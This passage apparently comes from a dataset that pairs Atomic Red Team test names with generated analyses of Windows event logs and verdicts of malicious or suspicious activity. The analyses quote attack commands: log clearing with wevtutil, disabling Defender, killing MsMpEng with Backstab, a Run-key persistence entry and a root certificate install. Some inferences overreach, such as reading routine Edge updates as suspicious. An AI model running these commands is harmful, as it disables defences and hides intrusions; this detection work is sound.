Considering these events, particularly the modification of IIS logging settings using PowerShell, the clearing of event logs, and the script execution with high integrity levels, these logs exhibit strong indications of malicious activity. The actions align with methods often used by adversaries to compromise systems, cover their tracks, and maintain persistence.

### Assessment and Resolution:
Based on the analysis, the resolution for these logs is **MALICIOUS**. The convergence of PowerShell abuse, event log clearing, and execution of administrative commands under high privileges clearly points to unauthorized and potentially harmful actions being taken on the system.

### Recommendations for Further Actions:
- **Immediate Response:** 
  - Isolate the affected host from the network to prevent any potential lateral movement or exfiltration.
  - Conduct a comprehensive forensic analysis to assess the extent of the compromise.
  
- **Review and Hardening:**
  - Assess and review user privileges, especially for `admin_test`, and limit the use of admin rights.
  - Strengthen logging and monitoring to ensure any malicious activities are detected promptly in the future.
  - Implement application whitelisting to restrict unauthorized use of PowerShell and sensitive commands.
  
- **Security Awareness and Updates:**
  - Ensure all systems, particularly web application configurations like IIS, are patched and secured according to best practices.
  - Conduct user training on recognizing phishing and social engineering attacks to reduce privileges misuse.

These steps are crucial to mitigate the threat and enhance the security posture moving forward."
DLL Side-Loading using the Notepad++ GUP.exe binary,"Upon reviewing the provided Windows event logs, several suspicious activities stand out, suggesting potential malicious activity or at least activity that warrants further investigation.

### Suspicious or Anomalous Behavior:

1. **Log File Clearing (System, Security, Windows PowerShell Logs):**
   - Multiple events depict the clearing of system logs (Event IDs 104 and 1102). A user named `admin_test` cleared logs for the System, Windows PowerShell, and Security channels at around the same system time.
   - The clearing of logs, especially security-related logs, can be indicative of an attempt to obfuscate malicious activity. It is commonly associated with actions taken by malicious actors post-compromise to cover their tracks.

2. **Use of `wevtutil` (Windows Event Utility):**
   - The `wevtutil.exe` tool, which is used for cleaning and managing Windows event logs, was executed several times by the user `admin_test`. The specific command `""C:\\Windows\\system32\\wevtutil.exe\"" cl Microsoft-Windows-Sysmon/Operational""` was used to clear specific log channels.
   - Frequent use of `wevtutil` by a singular user in a short timeframe is unusual and suggests log tampering.

3. **Presence of `GUP.exe` Executed from Temporary Directory:**
   - `GUP.exe`, categorized as a process under the `AtomicRedTeam` directory, was executed as a child process of `cmd.exe`. This indicates that it might be a part of a penetration testing or demonstration toolkit.
   - Atomic Red Team is a known framework for testing endpoint detection and response abilities; however, its deployment in a production environment without context can be suspicious.

4. **High Privilege Processes Initiated by Non-System Accounts:**
   - Privileged and potentially dangerous actions carried out by `SERVER002\\admin_test`, such as log clear commands, are concerning given their context of combined processes.
   - Processes like `wevtutil` run at a high integrity level.

### Assessment:

- **Indicators of Malicious Activity:**
  - The combination of log clearing actions and the execution of a tool associated with penetration testing frameworks (GUP.exe from `AtomicRedTeam`) implies either active threat actor activity or unauthorized testing occurring without explicit authorization or protective measures.

### Resolution:

- **SUSPICIOUS:** The activity outlined strongly suggests a deeper investigation is needed to confirm if this was a benign manual cleanup or unauthorized post-exploitation activity. The evidence does not definitively indicate an active threat, but it aligns with typical adversary behavior patterns.
  
### Guidance on How to Proceed:

1. **Immediate Steps:**
   - Isolate the affected host to prevent potential lateral movement.
   - Securely backup all logs and relevant system data for further forensic analysis.

2. **Further Investigation:**
   - Perform a thorough investigation to understand the context and intent behind running GUP.exe. Confirm if it was an authorized security test or an intrusion.
   - Review other system activity logs, user authorization records, and recent administrative changes.

3. **Strengthening Security:**
   - Implement stricter monitoring on privileged accounts and logging activities.
   - Conduct a review and possible revision of logging and auditing configurations to ensure tamper-proof records.
   - Educate technical staff on proper security testing protocols and ensure testing environments are isolated from production systems.

By addressing these steps, your organization can better understand the potential threat and establish stronger security postures to protect against future incidents."
Disable Windows Defender with PwSh Disable-WindowsOptionalFeature,"Based on the analysis of the provided event logs, let's summarize the findings, identify any indicators of suspicious or malicious activity, and determine the appropriate resolution.

1. **Event Log Clearing:**
   - There are multiple entries in both the Security and System logs indicating that logs were cleared by the user `SERVER002\admin_test` using the `wevtutil` command (`wevtutil.exe cl`) at `2024-10-28 09:53:20`. Clearing event logs, particularly without a clear legitimate reason, is often a tactic used by attackers to cover their tracks.

2. **Disabling Windows Defender Features:**
   - The PowerShell logs show that a series of commands were executed to disable various Windows Defender features (`Windows-Defender-Gui`, `Windows-Defender-Features`, `Windows-Defender`, and `Windows-Defender-ApplicationGuard`) using `Disable-WindowsOptionalFeature`. This is highly suspicious as disabling security features could be an attempt to evade detection.

3. **Process Execution & Integrity:**
   - The Sysmon logs corroborate the execution of `wevtutil.exe` to clear logs, as mentioned above.
   - The `High` integrity level of processes indicates that the actions have administrative privileges, aligning with the ability to clear logs and disable system features.

4. **Edge Update Activity:**
   - There are multiple entries related to `MicrosoftEdgeUpdate.exe`, indicating it was launched as part of a routine system update. There is no direct evidence within these logs indicating these actions are malicious.

### Conclusion:

The significant finding is the clearing of event logs and the disabling of Windows Defender features, which are explicit indicators of potentially malicious activity aimed at maintaining persistence or evading detection within a system. These actions align with tactics used during a system compromise.

**Resolution: MALICIOUS**

### Recommendations:

1. **Immediate Response:**
   - Isolate the affected system to prevent any potential lateral movement or data exfiltration.
   - Begin a full malware scan using alternate security solutions that might not be disabled.
   - Review user accounts and their permissions, particularly focusing on `SERVER002\admin_test`.

2. **Investigation and Cleanup:**
   - Conduct a comprehensive forensic investigation to identify further indicators of compromise (IOCs).
   - Review other systems connected to the network for similar signs of compromise.
   - Restore any affected systems from clean backups, ensuring that vulnerabilities and security policies are addressed before going back online.

3. **Prevention Measures:**
   - Implement strict access controls and least privilege policies.
   - Regularly audit and monitor critical systems for log clearing or security feature alteration.
   - Educate staff on security protocols and the potential damage of administrative commands. 

These steps will help mitigate risks and address the potentially malicious activities observed."
Install root CA on Windows,"Upon reviewing the provided logs, several suspicious activities stand out which warrant further investigation:

1. **Log File Cleared**: 
   - **EventID 1102 in Security Log** indicates that the security log was cleared by the user 'admin_test'. Clearing logs is often an attempt to cover tracks after malicious activities.
   - **EventID 104 in System Log** confirms that the system log was also cleared by 'admin_test'. Frequent clearing of logs without legitimate reason can be a red flag.

2. **Use of Windows Event Utility**:
   - The Sysmon logs document multiple instances of the `wevtutil.exe` utility (EventID 1) used to clear logs from various channels such as Microsoft-Windows-Sysmon and Windows PowerShell by the same user 'admin_test'. Running `wevtutil` to clear logs aligns with behavior aimed at log manipulation to hide unauthorized activities.

3. **Execution of Suspicious PowerShell Commands**:
   - There are several instances of `powershell.exe` execution with suspicious command-line arguments involving a certificate import (`Import-Certificate -FilePath rootCA.cer`) and moving it to a trusted store (`Move-Item -Path $cert.PSPath -Destination ""Cert:\\LocalMachine\\Root""`). This could be indicative of an attacker attempting to install a trusted root certificate to intercept encrypted communications or falsify digital signatures.

4. **Privilege Use and System Compromises**:
   - **EventID 4672 in Security Log** shows that the 'SYSTEM' account was granted several high privileges. While not inherently malicious, this shows high-level activity, and combined with other evidence, might suggest malicious activity.
   - Multiple processes were started that seem benign individually, such as `conhost.exe`, `whoami.exe`, often used in scripting and shell environments to write scripts that interact with the system.

Based on these logs, the following guidance is provided:

- **Conduct a comprehensive review of user account activities**, focusing on 'admin_test' to determine if the account is compromised.
- **Review system and network security controls** to identify if there has been a breach and to prevent repeat occurrences.
- **Ensure that security logs are configured to generate alerts** on suspicious activities such as log clearance and use of powerful tools like PowerShell with non-standard command lines.
- **Investigate all machines in the network** for similar activities to ensure there's no lateral movement by a potential attacker.

The final assessment of the activities observed is:
- **Resolution: MALICIOUS**

This determination is based on evidence of log clearance, usage of PowerShell for suspicious activities involving certificates, and manipulation of the system processes, all indicative of potential malicious intent. Immediate action should be taken to quarantine affected systems and prevent further unauthorized access."
Kill antimalware protected processes using Backstab,"Upon analyzing the provided Windows event logs, several indicators suggest potential malicious activity:

1. **Usage of PowerShell for Potentially Malicious Commands:**
   - There are events indicating PowerShell executing with a specific command line: `""powershell.exe"" & {& \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\Backstab64.exe\"" -k -n MsMpEng.exe}`. The path and the executable name ""Backstab64.exe"" are highly suspicious and resemble known attack patterns, potentially indicative of an attempt to execute a malicious payload.

2. **Clearing of Event Logs:**
   - Multiple event logs are cleared around the same time window. The system log, PowerShell log, and security log indicate events with IDs related to log clearing (`Sysmon EventID 5` and `System EventID 104` for log files being cleared by the user `SERVER002\admin_test`). Log clearing can be a strong indicator of an attacker attempting to cover their tracks post-compromise.

3. **Execution of `wevtutil` Command-line Utility:**
   - The logs show the execution of `wevtutil.exe` with commands to clear several event channels, such as Microsoft-Windows-Sysmon and Security. This correlates with the log clearing activities and further raises suspicion about intentional hiding of traces.

4. **Unusual Parent-Child Process Relationships:**
   - Several processes, including PowerShell, conhost.exe, wevtutil.exe, and cmd.exe, are being invoked in succession, which represents command execution frequently associated with post-exploitation activities. 

5. **Presence of Tools Related to Known Attack Simulations:**
   - Usage of the tool or script from the path related to ""AtomicRedTeam"", which is widely recognized as a suite of ‘attack tests’ for security operations centers, indicates this might either be an actual attack or a red team exercise. However, finding such tools in use without prior knowledge or authorization is suspicious.

Given the above findings, the analysis suggests that these activities could very well indicate an ongoing or past compromise, with attempts to clean up traces by clearing logs and executing suspicious commands/files through PowerShell.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- Isolate the affected system to prevent further spread or unauthorized access.
- Perform a full forensic analysis to understand the extent of compromise and investigate whether data was exfiltrated or if any credentials were harvested.
- Review access logs and credential use to check for lateral movement.
- Strengthen monitoring of PowerShell and employ logging around critical system files and directories.
- Conduct a thorough review of administrative access and reset passwords as a precaution.
- Inform the incident response team to prepare for possible remediation steps."
Execution of non-dll using rundll32.exe,"### Analysis of Logs

Upon examining the provided Windows event logs, several indicators suggest potential malicious behavior that should be investigated further. Key observations are as follows:

1. **Log Clearing Events:**

   - **System and PowerShell Event Log Clearing:** The logs contain multiple instances of `EventID 104` from the Microsoft-Windows-Eventlog provider, indicating that logs for the System and Windows PowerShell channels were cleared by the user `admin_test`. 
   - **Security Log Clearing:** Similarly, `EventID 1102` in the Security log indicates that security logs were cleared by the same user. Clearing of event logs is a common tactic used by malicious actors to cover their tracks after executing malicious activities.

2. **Suspicious PowerShell Activity:**
   
   - The Windows PowerShell logs reveal the execution of a command (`rundll32.exe`) with a suspiciously named file (`calc.png`). This is a known method of executing malicious code by abusing `rundll32.exe` to execute arbitrary DLLs, often masked with image file extensions. 
   - Specifically, the command line `powershell.exe & {rundll32.exe C:\\Users\\$env:username\\Downloads\\calc.png, StartW}` indicates possible attempts to execute non-standard DLLs through PowerShell scripts.

3. **Use of `wsmprovhost.exe`:**
   
   - Multiple instances of `wsmprovhost.exe` (Windows Remote Management Host) appear as parent processes for commands that include log clearing utilities (`wevtutil.exe`). This can signify unauthorized remote management or malicious post-exploitation activities attempting to maintain persistence or hide activities.

4. **Potential Exploit Chain or Lateral Movement:**

   - The sequence of events shows a repetitive pattern involving the clearing of various event logs almost simultaneously after executing suspicious PowerShell commands. This behavior could represent an attacker rapidly covering tracks post-compromise and possibly preparing for lateral movement.

5. **Command and Control Indicators:**

   - Processes such as `SecurityHealthService.exe` and services related to Microsoft Edge updates (i.e., `MicrosoftEdgeUpdate.exe`) are reported run by `NT AUTHORITY\SYSTEM`. While legitimate itself, the high volume and timing with host integrity check services could potentially mask malicious activity.
   
### Conclusion

Based on the above observations, it is likely that the logs contain indicators of malicious activity. The clearing of logs and suspicious PowerShell commands, specifically executing potentially harmful scripts via `rundll32.exe`, are strong indicators of malicious intent.

**Final Assessment: MALICIOUS**

### Recommendations

1. **Immediate Isolation:** Isolate the affected host to prevent further potential malicious activity or lateral movement across the network.
2. **Full Forensic Investigation:** Conduct a thorough investigation on the suspicious files and running processes, especially focusing on the PowerShell commands and `rundll32.exe`.
3. **Logs Review:** Retrieve and examine backups or server-side logs for additional context and potential lateral movement or data exfiltration attempts.
4. **Review User Activity:** Investigate the `admin_test` account’s recent activities to determine if it has been compromised.
5. **System Restoration and Hardening:** Once evidence is collected, restore the host using clean backups and harden the system, including disabling unnecessary services and enforcing stricter PowerShell execution policies."
Activate Windows NoDesktop Group Policy Feature,"Based on the provided log entries, here are the primary observations and analysis regarding potentially suspicious or anomalous activities:

1. **Event Log Clearing**:
    - Multiple entries indicate the clearing of event logs. In particular, the usage of `wevtutil.exe` to clear various logs — `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, and `Security` — raises suspicion. This action was performed by `admin_test` user, which generally is seen as an attempt to cover tracks following malicious activities.

2. **Registry Modification**:
    - The `cmd.exe` process executed a command to modify a registry key under `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer` to add `NoDesktop`. While registry modifications are common, those relating to user policies can potentially indicate attempts at persistence or environmental changes that may facilitate further malicious activity.

3. **Consistent Use of Elevated Privileges**:
    - All observed actions were performed with high integrity levels by the `admin_test` user, hinting at potential misuse of administrative privileges.

4. **Time Manipulation**:
    - There's an entry indicating a time change by `svchost.exe`, performed by `LOCAL SERVICE`, which is unusual. Time manipulation could potentially aid in disrupting timestamps used in forensic investigations.

5. **Service Stops**:
    - The event logs describe the stopping of the `edgeupdate` service. However, without further context or additional evidence, this in itself may not immediately suggest malfeasance.

6. **Execution of Monitoring Processes**:
    - The frequent execution of `whoami.exe` and `hostname.exe` can be benign, but in conjunction with log deletion and registry modifications, might support reconnaissance staged by an adversarial actor.

### Conclusion:

The combination of event log clearing, registry modification without clear benign intent, execution of high-integrity processes, and time manipulation strongly suggest potential malicious intent.

**Resolution**: MALICIOUS

### Recommendation:

1. **Immediate Investigation**: Conduct a detailed investigation on `SERVER002`, focusing on the integrity and subsequent uses of administrative accounts, especially `admin_test`.
2. **Access Logs and Network Traffic**: Evaluate related access logs and network traffic for anomalies around the mentioned timestamps.
3. **Endpoint Monitoring**: Increase monitoring on `SERVER002` and consider isolating it to prevent potential lateral movement or further compromise.
4. **Security Policies**: Review and enforce security policies related to administrative access and logging, ensuring that security logs are not easily tampered with in future incidents.
5. **Incident Response**: Consider invoking an incident response protocol to ensure robust handling of potential breaches, including engagement with all affected systems."
Windows Modify Show Compress Color And Info Tip Registry,"### Detailed Analysis

1. **Log File Clearing Events**:
   - The logs show that the event logs for System, Windows PowerShell, and Security have been cleared by the user `admin_test` (Security Log EventID 1102, System Log EventID 104). This is a red flag as it often indicates an attempt to cover up illicit or suspicious activity. The timing of these log clearances is concerning, and it's highly suspicious as they were done in rapid succession.

2. **Use of Wevtutil**:
   - The use of `wevtutil.exe` (Sysmon Log entries with EventID 1 and various timestamps) to clear logs (`cl` command as seen in CommandLine attributes) is captured multiple times. This tool is often utilized in log maintenance activities. However, its use immediately before or after suspicious activities is indicative of malicious intent to cover tracks.

3. **Suspicious Cmd.exe Activity**:
   - There are entries indicating the execution of `cmd.exe` to modify registry values using the `reg.exe` tool (Sysmon Log entries with EventID 1, ProcessId 5336 for `cmd.exe`, and subsequent entries for `reg.exe`). The registry keys being modified are part of the Windows Explorer settings, which might not be critically harmful by themselves but are unusual if not part of a routine system maintenance or configuration task. This could indicate potential preparatory steps for further action or data exfiltration.

4. **Process Execution Patterns**:
   - The presence of multiple Microsoft Edge Update activities is captured across logs. These could be legitimate updating activities; however, the overall timing with other suspicious activities necessitates a deeper look into whether these are standard updates or leveraged processes for masquerading malicious actions.

5. **General Process Integrity**:
   - Although processes related to `Microsoft-Windows-Security-SPP`, `PowerShell`, and `edgeupdate` are noted, they don't show immediate signs of compromise beyond timing correlation. These can indicate routine operations unless other evidence suggests otherwise.

### Conclusion

Based on the analysis of these logs, the activities around the clearing of event logs and the use of command-line tools like `wevtutil.exe` and `cmd.exe` for registry changes are suspicious and could indicate an effort to conceal malicious behaviors or preparatory actions for compromise. Given the evidence, the actions observed require further investigation to confirm the intent and scope of activity.

### Resolution: **SUSPICIOUS**

**Recommendations**:
- Initiate a full investigation into the user account `admin_test` and its activities, specifically log in sessions, administrative rights, and any recent significant changes or configurations made on `Server002`.
- Analyze network traffic around the time-stamps to see if there are any corresponding suspicious outbound connections or data transfers.
- Verify the source and legitimacy of Edge update activities happening around the same time.
- Look for additional indicators of privilege escalation or lateral movement within the network environment.
- Consider restoring the cleared event logs from backups, if possible, to understand historical activities leading up to these events."
Modify Registry of Local Machine - cmd,"Upon reviewing the provided Windows event logs, the following key observations can be made:

1. **Log Clearing Events:**
   - There are multiple instances of the `wevtutil` command being executed to clear the Windows event logs (`Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, and `Windows PowerShell` logs). Examples can be seen in the logs where `wevtutil.exe` is executed with the `cl` (clear) flag.
  
2. **Command Execution:**
   - There's an occurrence where `cmd.exe` is used to add a registry key under `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run`. The command used is `""cmd.exe"" /c reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /t REG_EXPAND_SZ /v SecurityHealth /d calc.exe /f`. This command adds a registry entry that will execute `calc.exe` upon system start, which is a known persistence mechanism used by adversaries.

3. **Persistence Mechanism:**
   - The act of creating a registry key for startup execution (`SecurityHealth`, targeting `calc.exe`) strongly suggests an attempt to establish persistence on the system.

4. **Malicious Intent Indicators:**
   - The combination of `wevtutil` clearing event logs (which can be indicative of an attempt to hide traces) and a suspicious registry modification for persistence strongly points towards malicious activities.

5. **Miscellaneous Activity:**
   - Other activities captured in the logs, such as the execution of `hostname.exe` and `whoami.exe`, appear benign and could be a part of normal operational activities or investigative scripts run by an administrator. Similarly, the Microsoft Edge update operations do not raise immediate red flags.

**Assessment:**

Based on the analysis:
- The actions observed related to clearing event logs and setting registry keys for startup execution (e.g., to run `calc.exe`) are indicative of suspicious and potentially malicious activities. These are classic tactics used by adversaries to maintain persistence and obfuscate their tracks on a compromised system.

**Resolution: MALICIOUS**

**Guidance:**
- Immediately conduct a more detailed forensic investigation to identify any further compromise or indicators of further malicious activities.
- Isolate the affected host to prevent any potential propagation.
- Review and monitor other systems for similar indicators.
- Consider other remediation actions like reversing the persistence mechanism (registry changes) and investigating the vector of initial compromise.
- Enhance monitoring to detect similar activities and conduct a thorough security posture review."
Indirect Command Execution - pcalua.exe,"The logs provided demonstrate several events occurring around the same time on October 25, 2024. Notably, there is activity involving log file clearing, use of command-line utilities, and execution of Windows processes that could indicate suspicious behavior. Here's a detailed analysis:

### Key Observations:

1. **Log File Clearing:**
   - **System Event ID 104**: These logs show that the System, Windows PowerShell, and Security logs were cleared by the user ""admin_test"". This is a notable action often associated with malicious activity when done without legitimate administrative need, as it may be an attempt to cover unauthorized or malicious actions.

2. **Command-Line Utility Usage:**
   - Multiple instances of `wevtutil.exe` were executed with the `cl` (clear) command to clear logs (Sysmon/Operational, Application, Security).
   - Clearing crucial logs, especially by using command-line utilities, suggests an intentional act to remove traces of activity.

3. **Process Activity:**
   - The logs indicate several normal Windows processes executing, like `HOSTNAME.EXE`, `whoami.exe`, `conhost.exe`, and `cmd.exe`.
   - However, the use of `cmd.exe` with a command line executing `pcalua.exe` (Program Compatibility Assistant) followed by `calc.exe` raises suspicion. This complexity can be leveraged to execute a different payload under the guise of legitimate applications or bypass some security checks.

4. **User Context:**
   - The recurring user context is ""SERVER002\admin_test"", which is responsible for executing these suspicious activities. It aligns with activities that require elevated privileges, such as log clearing.

### Assessment:
- **Suspicious Activity**: The combination of log file clearing and the weird usage pattern of legitimate applications is highly suspicious. These actions might indicate an attempt to cover up some unauthorized activity or test security boundaries.

### Resolution:
- **Resolution**: **SUSPICIOUS**
  - The ongoing actions—specifically log clearing across significant system logs—are red flags demanding further investigation. A thorough internal audit should be conducted to ascertain the legitimacy of ""admin_test""'s access and actions during this timeframe.
  - Investigate the following:
    * Contact the user or responsible entity to understand if these might be part of legitimate operations or testing that wasn’t communicated.
    * Review system patching, any unauthorized changes, or signs of exploitation attempts.
    * Check for any correlating alerts from security monitoring tools around this time.
    * Verify if there are secondary indicators that may support a compromise, such as network traffic anomalies or unexpected access patterns. 

This activity requires investigation to confirm if it was benign (e.g., a maintenance task not properly documented) or to further escalate as a potential security incident if any malicious intentions are suspected."
Disable Win Defender Notification,"Upon reviewing the provided logs, I have identified several key points that indicate potential malicious activity. Below is a detailed analysis:

### Suspicious or Anomalous Behavior:

1. **Log File Clearing:**
   - There are multiple instances where the log files for `System`, `Windows PowerShell`, and `Security` logs were cleared in quick succession, executed by the user `admin_test`. The clearing of logs (`Microsoft-Windows-Eventlog` EventID 104 and EventID 1102) can often be associated with malicious activity as it is a common tactic used by attackers to cover their tracks.

2. **Use of `wevtutil.exe`:**
   - The tool `wevtutil.exe` was executed multiple times by the same user `admin_test` to clear event logs. Each execution corresponds with the clearing of logs in the `System` log (EventID 104) and in the `Security` log (EventID 1102). The execution of `wevtutil.exe` with the `cl` command (short for `clear log`) is particularly suspicious in this context as it complements the observed log clearing events.

3. **Registry Modification:**
   - There was an execution of `cmd.exe` and `reg.exe` with the command line argument to modify Windows Defender settings to disable notifications (`C:\Windows\System32\reg.exe reg  add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications"" /v ""DisableNotifications"" /t REG_DWORD /d 1 /f`), which is a potential attempt to weaken security defenses on the system. This activity was again run under the user `admin_test`.

4. **Command Line Arguments:**
   - Notably, the `cmd.exe` and subsequent `reg.exe` indicate potential privilege elevation or unauthorized configuration changes. Disabling Windows Defender notifications is a recognized attempt to reduce visibility on the system.

5. **Time Discrepancy:**
   - There are `Kernel-General` (EventID 1) events indicating a system time change was performed. Though not necessarily malicious, adjusting system time can be used by attackers to confuse timestamp-based detection strategies.

### Events Indicating Malicious Activity or Compromise:

- The consistent use of `admin_test` for actions like clearing the logs and adjusting registry settings is a red flag for insider compromise or credential misuse.
- Clearing of logs, particularly in such a rapid sequence, strongly suggests an intention to hide activities on the host.
- Registry changes to disable security notifications via command line (`cmd.exe` and `reg.exe`) are highly indicative of attempted tampering with system security settings.

### Assessment, Threats, and Risks Identified:

Given the analysis of the logs, there is strong evidence of malicious activity:
- The sequences and patterns observed align with common post-exploitation activities intended to reduce system defenses and conceal tracks.
- Unauthorized registry changes to security settings emphasize the risk of compromised system defenses, leading to possible further exploitation or data exfiltration.

### Guidance on How to Proceed:

1. **Resolution: MALICIOUS**
   - This log analysis concludes that the observed activities indicate a compromise with malicious intent. Immediate action is recommended.

2. **Suggested Actions:**
   - Conduct a full incident response investigation to ascertain the extent and impact. This should include examining other network systems for similar activities or compromise indicators.
   - Review and possibly reset credentials, particularly for the user `admin_test` and any related accounts. 
   - Improve monitoring to include alerting on such log-clearing actions and unauthorized registry changes in the future.
   - Consider implementing stronger access controls and logging mechanisms to prevent unauthorized actions.

This situation should be treated with urgency to prevent further potential damages and ensure enhanced security posture moving forward."
Javascript in registry,"Upon reviewing the provided logs, the following observations and analysis can be made that indicate suspicious or malicious activity:

1. **PowerShell Logs:**
   - Multiple PowerShell events involve the command:
     ```powershell
     powershell.exe & {New-ItemProperty ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"" -Name T1112 -Value ""<script>""}
     ```
   - The command above is making changes to the Windows Registry, particularly to Internet settings, which is anomalous. The usage of ""T1112"" as a property name is particularly concerning as it resembles a reference to the MITRE ATT&CK technique T1112, which refers to ""Modify Registry"". Additionally, passing a script as a value is a red flag for potential scripting attacks or persistence mechanisms often seen in malicious activity.

2. **Sysmon Logs:**
   - A pattern of clearing event logs is observed with wevtutil.exe (Eventing Command Line Utility). This includes events targeting various channels such as ""Microsoft-Windows-Sysmon/Operational"", ""Application"", ""System"", ""Security"", and ""Windows PowerShell"".
   - The clearing of logs is coupled with high integrity privileges and the execution of PowerShell commands, both under the user `SERVER002\admin_test`. This behavior is indicative of a potential attempt to cover tracks following unauthorized activities.

3. **System Logs:**
   - There are records of event log clearance by the user `SERVER002\admin_test`. Specifically, event ID 104 shows the clearance of system logs, which further raises concerns due to the correlation with potentially malicious PowerShell activities.

4. **Security Logs:**
   - Event ID 1102, which logs the clearance of security logs by the user `SERVER002\admin_test`, supports the hypothesis of deliberate log tampering to mask suspicious actions.
   - The privilege escalation event (ID 4672) observed for the user `admin_test` with privileges such as `SeDebugPrivilege`, `SeBackupPrivilege`, and others, indicates high-level access typically reserved for administrative tasks, which can be exploited by attackers to conduct malicious activities.

5. **Command Execution Patterns:**
   - The use of legitimate Windows binaries (wevtutil.exe) for potentially malicious purposes, known as ""Living-off-the-Land"" binaries (LOLBins), combined with registry modification, points toward sophisticated threat tactics.
   - Usage of commands like `whoami.exe` and `hostname.exe` suggests enumeration typically performed during initial compromise or post-exploitation.

### Conclusion

Based on the suspicious PowerShell activity, repeated clearance of multiple logs (indicative of hiding tracks), and execution of registry modifications under the context of potentially malicious actions, it's prudent to classify this collection of events as:

- **Resolution: MALICIOUS**

### Recommended Actions

1. **Incident Response Initiation:**
   - Initiate a full incident response process to isolate, contain, and mitigate further spread.
   
2. **Forensic Analysis:**
   - Conduct thorough forensic analysis to uncover the extent of the compromise, including memory and disk analysis.

3. **Audit and Review:**
   - Review user activity for `SERVER002\admin_test`, including recent changes, logins, and associated network traffic.
   
4. **Strengthen Detection and Response:**
   - Enhance monitoring, especially around PowerShell usage and log clearance activities.
   - Employ more restrictive policies regarding the use of high-integrity privileges.

5. **Remediation Steps:**
   - Revoke potentially compromised credentials and ensure system patching and antivirus/endpoint security are up-to-date.

6. **Awareness and Training:**
   - Provide security awareness training focusing on recognizing social engineering attacks and secure usage of administrative privileges."
Rundll32 execute VBscript command using Ordinal number,"Upon reviewing the provided Windows event logs, the following observations and analysis can be made:

1. **Log Clearing Activity**:
   - There are multiple instances of log clearing events, indicated by EventID 104 in the System log and EventID 1102 in the Security log. These events were triggered by the user ""admin_test"" from SERVER002, with events at similar timestamps. Clearing of event logs can be suspicious, especially when done frequently or without proper system maintenance justifications, as it can be an attempt to cover tracks after malicious activities.

2. **Process Execution Anomalies**:
   - In the Sysmon log, there are multiple instances of legitimate processes like `MicrosoftEdgeUpdate.exe` and `svchost.exe` running under the SYSTEM account. However, one specific event stood out: 
     - **EventRecordID 17991**: A `cmd.exe` process runs with a command-line argument that uses `rundll32.exe` to execute a VBScript to launch `calc.exe`. This technique is a known indicator of misuse of `rundll32.exe` for code execution, often seen in obfuscated or hidden execution of malicious activities. While launching `calc.exe` might seem benign, the use of `rundll32.exe` and scripting could suggest either a testing phase by an attacker or an onboarding stealthy method for further exploitation.
   
3. **Time Change Events**:
   - Multiple time change events appear (EventID 4616 from Security log) within the logs which show the system time was altered. Time manipulation can be associated with attempts to synchronize events or cover tracks, thereby aligning with potential malicious behaviors.

4. **Privilege Escalation**:
   - The security logs show several occurrences of EventID 4672, indicating a user account, ""admin_test,"" receiving privileges like `SeDebugPrivilege`, `SeLoadDriverPrivilege`, etc. These privileges allow advanced operations and are critical to note if they are being used improperly.

5. **Network-related Anomalies**:
   - Security log EventID 4799 was triggered by a process associated with Edge update setup, suspiciously interfacing with the Builtin Users group. This could suggest unauthorized modifications to user groups.

Given these observations, particularly the nuanced use of `rundll32.exe` for potential malicious script execution and the clearing of critical logs, the activities captured in the logs should not be dismissed as benign without further detailed investigation.
  
### Conclusion: SUSPICIOUS

While there is no definitive outright malicious activity confirmed undoubtably from process names and standard updates or system operations alone, the combination of log clearing, potential obfuscated script execution, privilege escalation, and system time adjustments align with indicators of suspicious behavior that merit additional investigation to rule out or confirm malicious actions.

### Recommended Actions:
- Conduct a more in-depth forensic analysis of the machine, specifically focusing on `rundll32` usage, and determine the origin and intent behind those commands.
- Review user activity, logon sessions, and privilege usage of the ""admin_test"" account.
- Analyze network traffic, particularly from `fe80::e3b5:5371:12a8:9c77`, and other logged IPs for suspicious patterns.
- Check for any abnormal or unapproved software installations and running services.
- Audit the integrity of critical system files and installed applications.
- Ensure backup and recovery solutions are current and verify the integrity of those backups."
Invoke HTML Application - Jscript Engine Simulating Double Click,"Upon reviewing the provided logs, several events suggest potentially malicious behavior on the host ""Server002."" The analysis highlights the following key observations:

### Key Observations:

1. **Multiple Uses of Wevtutil.exe for Log Clearing:**
   - The logs indicate repeated execution of `wevtutil.exe` with command lines to clear multiple event logs, such as ""Microsoft-Windows-Sysmon/Operational,"" ""Application,"" ""System,"" ""Security,"" and ""Windows PowerShell.""
   - This behavior, particularly from a non-system account (`SERVER002\\admin_test`), is atypical for legitimate administrative tasks and may suggest an attempt to cover tracks after a compromise.

2. **Usage of PowerShell with Suspicious Command:**
   - There is a PowerShell execution (`C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`) with a potentially harmful command: `Invoke-ATHHTMLApplication -HTAFilePath Test.hta -ScriptEngine JScript -SimulateUserDoubleClick`.
   - The usage of an HTA file in conjunction with PowerShell scripting can be indicative of malicious activity, such as payload delivery or execution.

3. **High Privilege Execution:**
   - The processes often execute with ""High Integrity Level,"" indicating admin-level permissions. This level of access is often necessary for attackers to maintain persistence or to carry out system-wide changes.

4. **Events Log Significant Activities During a Short Time Frame:**
   - The operations performed, such as using `whoami.exe`, `hostname.exe`, and `taskhostw.exe`, could be a result of reconnaissance activities commonly observed in post-exploitation phases by adversaries gathering environment details.

5. **Clearing of Event Logs:**
   - Instances where logs are cleared are concerning. The records show `EventID: 1102` for ""Security log"" and similar entries for other logs, suggesting actions to hide footprint traces.
   
### Conclusion:
The combination of log-clearing activities, suspicious PowerShell commands, and admin-level access evident in the logs strongly suggests malicious activity. These signs are consistent with techniques used in attacks where adversaries attempt to evade detection by clearing logs and executing potentially harmful scripts.

### Resolution:
**Resolution: MALICIOUS**

### Guidance:
1. **Isolate the Host:** Immediately isolate ""Server002"" from the network to prevent further potential malicious activity.
2. **Further Investigation:**
   - Conduct a thorough investigation on ""Server002"" to identify any additional indicators of compromise (IoCs).
   - Review any related network traffic and digital footprints that might offer clues about lateral movement or data exfiltration.
3. **Review Access Policies:**
